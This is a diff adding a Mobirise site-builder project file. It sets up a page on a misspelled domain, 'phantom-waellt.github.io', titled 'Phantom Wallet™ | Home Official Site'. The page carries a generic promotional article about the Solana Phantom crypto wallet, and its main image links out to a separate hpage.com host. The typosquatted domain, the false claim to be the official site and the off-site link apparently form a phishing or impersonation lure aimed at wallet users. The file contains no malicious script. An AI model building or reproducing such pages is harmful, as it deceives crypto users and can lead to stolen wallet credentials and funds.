@@ -1,0 +1,147 @@
+{
+  "settings": {
+    "name": "Site 2023-12-20 14:35",
+    "currentPage": "index.html",
+    "theme": {
+      "name": "startm5",
+      "title": "StartM5",
+      "titlePreset": "StartM5",
+      "styling": {
+        "primaryColor": "#9fe870",
+        "secondaryColor": "#ffd7ef",
+        "successColor": "#3a341c",
+        "infoColor": "#320707",
+        "warningColor": "#a0e2e1",
+        "dangerColor": "#ffea64",
+        "mainFont": "Inter Tight",
+        "display1Font": "Inter Tight",
+        "display1Size": 5,
+        "display2Font": "Inter Tight",
+        "display2Size": 4,
+        "display5Font": "Inter Tight",
+        "display5Size": 2,
+        "display7Font": "Inter Tight",
+        "display7Size": 1.4,
+        "display4Font": "Inter Tight",
+        "display4Size": 1.4,
+        "isRoundedImages": true,
+        "isRoundedButtons": true,
+        "isLargeButtons": true,
+        "isGhostButtonBorder": true,
+        "underlinedLinks": false,
+        "isAnimatedOnScroll": false,
+        "isScrollToTopButton": false
+      }
+    },
+    "path": "@PROJECT_PATH@",
+    "versionFirst": "5.9.8",
+    "siteFonts": [],
+    "robotsSwitcher": true,
+    "robotsText": "User-agent: *\nDisallow: /cgi-bin\nSitemap: https://phantom-waellt.github.io/sitemap.xml\n\n",
+    "sitemapSwitcher": true,
+    "siteUrl": "https://phantom-waellt.github.io/",
+    "sitemapSwitcherAuto": "on",
+    "imageResize": true,
+    "usedWebp": true,
+    "favicon": false,
+    "mbrsiteDomain": "z8byfkxh5y",
+    "cookiesAlert": false,
+    "gdpr": false,
+    "uniqCompNum": 2,
+    "versionPublish": "5.9.8"
+  },
+  "pages": {
+    "index.html": {
+      "settings": {
+        "main": true,
+        "title": "Phantom Wallet™ | Home Official Site",
+        "meta_descr": "Your wallet. Multiple chains, one wallet. No more switching. Seamlessly access the largest NFT marketplaces. Showcase your NFT collection. Monitor activity with ...",
+        "header_custom": "",
+        "footer_custom": "",
+        "html_before": ""
+      },
+      "components": [
+        {
+          "alias": false,
+          "_styles": {
+            "background-color": "@bgColor",
+            "padding-top": "(@paddingTop * 15px)",
+            "padding-bottom": "(@paddingBottom * 15px)",
+            "img": {
+              "object-fit": "contain",
+              "border-radius": "0 !important"
+            }
+          },
+          "_name": "image04",
+          "_sourceTheme": "startm5",
+          "_customHTML": "<section data-bs-version=\"5.1\" class=\"image03\" group=\"Image & Video\">\n    <mbr-parameters>\n        <header>Size</header>\n        <input type=\"range\" inline title=\"Top\" name=\"paddingTop\" min=\"0\" max=\"10\" value=\"0\" step=\"1\">\n        <input type=\"range\" inline title=\"Bottom\" name=\"paddingBottom\" min=\"0\" max=\"10\" value=\"0\" step=\"1\">\n        <header>Show/Hide</header>\n        <input type=\"checkbox\" title=\"Caption\" name=\"showText\">\n        <header>Background</header>\n        <input type=\"color\" title=\"Color\" name=\"bgColor\" value=\"#ffffff\">\n    </mbr-parameters>\n\n    <div class=\"image-block m-auto\">\n        <a href=\"https://phantom-wallet.hpage.com\"><img src=\"@PROJECT_PATH@/assets/images/phantom-wallet.png\" alt=\"Phantom Wallet\"></a>\n        <div mbr-if=\"showText\">\n            <p class=\"mbr-text mt-4 pb-4 align-center mbr-fonts-style\" mbr-theme-style=\"display-7\" data-app-selector=\".mbr-text\">\n                Unlock your true path!\n            </p>\n        </div>\n    </div>\n</section>",
+          "_cid": "tYY7jH8geb",
+          "_protectedParams": [],
+          "_global": false,
+          "_once": false,
+          "_params": {},
+          "_anchor": "image04-0"
+        },
+        {
+          "alias": false,
+          "_styles": {
+            "& when not (@fullScreen)": {
+              "padding-top": "(@paddingTop * 1rem)",
+              "padding-bottom": "(@paddingBottom * 1rem)"
+            },
+            "& when (@bg-type = \"color\")": {
+              "background-color": "@bg-value"
+            },
+            "& when (@bg-type = \"image\")": {
+              "background-image": "url(@bg-value)"
+            },
+            ".mbr-fallback-image.disabled": {
+              "display": "none"
+            },
+            ".mbr-fallback-image": {
+              "display": "block",
+              "background-size": "cover",
+              "background-position": "center center",
+              "width": "100%",
+              "height": "100%",
+              "position": "absolute",
+              "top": "0",
+              "& when (@bg-type = 'video')": {
+                "background-image": "url(@fallBackImage)"
+              }
+            },
+            ".card-wrapper": {
+              "background": "@wrapBgColor",
+              "@media (max-width: 767px)": {
+                "padding": "2rem 1.5rem"
+              },
+              "@media (min-width: 768px) and (max-width: 991px)": {
+                "padding": "2.25rem"
+              },
+              "@media (min-width: 992px)": {
+                "padding": "4rem"
+              }
+            },
+            ".mbr-text, .mbr-section-btn": {
+              "color": "#000000",
+              "text-align": "left"
+            },
+            ".card-title, .card-box": {
+              "text-align": "left",
+              "color": "#000000"
+            }
+          },
+          "_name": "article07",
+          "_sourceTheme": "startm5",
+          "_customHTML": "<section data-bs-version=\"5.1\" class=\"article07\" group=\"Article\" data-bg-video=\"{{bg.type == 'video' && bg.value.url}}\" mbr-class=\"{\n    'mbr-fullscreen': fullScreen,\n    'mbr-parallax-background': bg.parallax}\">\n  <mbr-parameters>\n    <header>Size</header>\n    <input type=\"checkbox\" title=\"Full Screen\" name=\"fullScreen\">\n    <input type=\"checkbox\" title=\"Full Width\" name=\"fullWidth\">\n    <input type=\"range\" inline title=\"Top\" name=\"paddingTop\" min=\"0\" max=\"10\" step=\"1\" value=\"5\">\n    <input type=\"range\" inline title=\"Bottom\" name=\"paddingBottom\" min=\"0\" max=\"10\" step=\"1\" value=\"5\">\n    <input type=\"range\" inline title=\"Content Width\" name=\"contentWidth\" min=\"8\" max=\"12\" step=\"1\" value=\"10\">\n    <header>Show/Hide</header>\n    <input type=\"checkbox\" title=\"Title\" name=\"showTitle\" checked>\n    <input type=\"checkbox\" title=\"Subtitle\" name=\"showSubtitle\" checked>\n    <input type=\"checkbox\" title=\"Text\" name=\"showText\" checked>\n    <input type=\"checkbox\" title=\"Buttons\" name=\"showButtons\">\n    <input type=\"color\" title=\"Wrap Bg\" name=\"wrapBgColor\" value=\"#ffffff\">\n    <header>Background</header>\n    <fieldset type=\"background\" name=\"bg\" parallax>\n      <input type=\"image\" title=\"Image\" value=\"../_images/background1.jpg\" parallax>\n      <input type=\"color\" title=\"Color\" value=\"#edefeb\" selected>\n      <input type=\"video\" title=\"Video\" value=\"https://vimeo.com/428046504\">\n    </fieldset>\n    <header condition=\"bg.type === 'video'\">Fallback Image</header>\n    <input type=\"image\" title=\"Fallback Image\" value=\"../_images/background1.jpg\" name=\"fallBackImage\" condition=\"bg.type === 'video'\">\n    <input type=\"checkbox\" title=\"Overlay\" name=\"overlay\" condition=\"bg.type !== 'color'\" checked>\n    <input type=\"color\" title=\"Overlay Color\" name=\"overlayColor\" value=\"#ffffff\" condition=\"overlay && bg.type !== 'color'\">\n    <input type=\"range\" inline title=\"Opacity\" name=\"overlayOpacity\" min=\"0\" max=\"1\" step=\"0.1\" value=\"0.3\" condition=\"overlay && bg.type !== 'color'\">\n  </mbr-parameters>\n\n  <div class=\"mbr-fallback-image disabled\" mbr-if=\"bg.type == 'video'\"></div>\n  <div class=\"mbr-overlay\" mbr-if=\"overlay && bg.type!== 'color'\" mbr-style=\"{'opacity': overlayOpacity, 'background-color': overlayColor}\"></div>\n  <div mbr-class=\"{'container': !fullWidth, 'container-fluid': fullWidth}\">\n    <div class=\"row justify-content-center\">\n      <div class=\"card col-md-12 col-lg-{{contentWidth}}\">\n        <div class=\"card-wrapper\">\n          <h3 class=\"card-title mbr-fonts-style mbr-white mt-3 mb-4\" mbr-theme-style=\"display-2\" mbr-if=\"showTitle\" data-app-selector=\".card-title, .card-box\"><b><a href=\"https://phantom-waellt.github.io/\" class=\"text-primary\">Phantom</a>™ | Home Official Site\n</b><div><b><br></b></div></h3>\n          <div class=\"row card-box align-left\">\n            \n            \n            \n            <div class=\"item features-without-image col-12 active\">\n              <div class=\"item-wrapper\">\n                <h4 class=\"mbr-section-subtitle mbr-fonts-style mb-3\" mbr-if=\"showSubtitle\" data-app-selector=\".mbr-section-subtitle\" mbr-theme-style=\"display-5\"><b>Exploring the Revolutionary <a href=\"https://phantom.app/\" class=\"text-primary\">Phantom</a> Wallet: A Gateway to the Future of Decentralized Finance</b></h4>\n                <p class=\"mbr-text mbr-fonts-style\" mbr-theme-style=\"display-7\" mbr-if=\"showText\" data-app-selector=\".mbr-text, .mbr-section-btn\">In the ever-evolving landscape of blockchain technology and decentralized finance (DeFi), a notable player has emerged, promising a seamless and user-friendly experience for crypto enthusiasts—the Phantom Wallet. As the crypto space witnesses continuous innovation, Phantom stands out as a beacon of efficiency and accessibility, redefining the way users interact with decentralized applications (DApps) on the Solana blockchain. This article delves into the features, advantages, and potential impact of the Phantom Wallet on the rapidly expanding world of digital finance.\n<br>\n<br>Understanding Phantom Wallet:\n<br>\n<br>Phantom is a non-custodial wallet designed specifically for the Solana blockchain, known for its high throughput and low transaction costs. The wallet serves as a secure bridge between users and the decentralized ecosystem, allowing them to manage their digital assets and interact with various decentralized applications seamlessly. One of its distinguishing features is its user-friendly interface, which simplifies the onboarding process for both novice and experienced users.\n<br>\n<br>Key Features:\n<br>\n<br>User-Friendly Interface:\n<br>Phantom Wallet takes pride in its intuitive design, ensuring that users can navigate the platform effortlessly. The wallet's user interface is clean, minimalistic, and beginner-friendly, making it an attractive choice for those entering the world of decentralized finance for the first time.\n<br>\n<br>Seamless Integration with DApps:\n<br>Phantom is more than just a wallet; it's a gateway to a multitude of decentralized applications. Through seamless integration with various DApps, users can engage in activities such as decentralized exchanges, yield farming, and NFT marketplaces directly from the wallet interface. This integration streamlines the user experience, eliminating the need for multiple applications.\n<br>\n<br>Security and Privacy:\n<br>Security is paramount in the crypto space, and Phantom Wallet prioritizes the safety of users' assets. Employing industry-standard security measures such as private key encryption and biometric authentication, Phantom ensures that users have full control over their digital assets while maintaining the highest level of security.\n<br>\n<br>Cross-Platform Compatibility:\n<br>Phantom Wallet is not limited to a single device or operating system. With cross-platform compatibility, users can access their wallet seamlessly from various devices, including desktops, laptops, and mobile devices. This flexibility enhances the accessibility of decentralized finance, allowing users to manage their assets wherever they are.\n<br>\n<br>Advantages of Phantom Wallet:\n<br>\n<br>Low Transaction Costs:\n<br>Leveraging the Solana blockchain's efficiency, Phantom Wallet boasts incredibly low transaction costs. This feature makes it an attractive choice for users looking to engage in frequent transactions without worrying about exorbitant fees.\n<br>\n<br>Fast Transaction Speeds:\n<br>The Solana blockchain's high throughput enables Phantom Wallet to facilitate rapid transaction confirmations. Users can experience near-instantaneous transaction speeds, eliminating the delays commonly associated with some other blockchain networks.\n<br>\n<br>Community Support:\n<br>Phantom Wallet has garnered significant community support, contributing to its rapid adoption. The active community not only enhances the wallet's development through feedback but also fosters a collaborative environment for users to share insights, tips, and troubleshooting assistance.\n<br>\n<br>Open-Source Nature:\n<br>Phantom Wallet operates on an open-source framework, promoting transparency and allowing developers to contribute to its improvement. The open-source nature encourages innovation and ensures that the wallet evolves in tandem with the rapidly changing landscape of decentralized finance.\n<br>\n<br>The Impact of Phantom Wallet on DeFi:\n<br>\n<br>Mass Adoption:\n<br>The user-friendly interface and efficient design of Phantom Wallet make it an ideal choice for mass adoption. As more users enter the DeFi space, platforms like Phantom play a crucial role in simplifying the onboarding process and encouraging widespread participation.\n<br>\n<br>Elevating Solana's Ecosystem:\n<br>Phantom Wallet's exclusive integration with the Solana blockchain contributes to the growth and prominence of the Solana ecosystem. As users flock to the wallet for its efficiency and low costs, the demand for Solana-based DApps and projects is likely to surge.\n<br>\n<br>Shaping the Future of Wallets:\n<br>Phantom Wallet serves as a model for the next generation of cryptocurrency wallets. Its emphasis on user experience, security, and integration with decentralized applications sets a standard for wallets seeking to provide a comprehensive and streamlined experience for users.\n<br>\n<br>Conclusion:\n<br>\n<br>In the ever-changing landscape of decentralized finance, the Phantom Wallet emerges as a beacon of innovation, transforming the way users interact with digital assets and decentralized applications. With its user-friendly interface, low transaction costs, and seamless integration with DApps, Phantom has the potential to shape the future of cryptocurrency wallets and contribute significantly to the widespread adoption of decentralized finance. As the crypto community continues to evolve, platforms like Phantom play a pivotal role in bridging the gap between traditional finance and the decentralized future.</p>\n              </div>\n            </div>\n          </div>\n          <div mbr-buttons mbr-theme-style=\"display-7\" class=\"mbr-section-btn\" mbr-if=\"showButtons\" data-toolbar=\"-mbrBtnMove\">\n            <a class=\"btn btn-primary\" href=\"https://mobiri.se\" data-app-placeholder=\"Type Text\">Start Now</a>\n          </div>\n        </div>\n      </div>\n    </div>\n  </div>\n</section>",
+          "_cid": "tYY7kmsA92",
+          "_anchor": "article07-1",
+          "_protectedParams": [],
+          "_global": false,
+          "_once": false,
+          "_params": {}
+        }
+      ]
+    }
+  }
+}
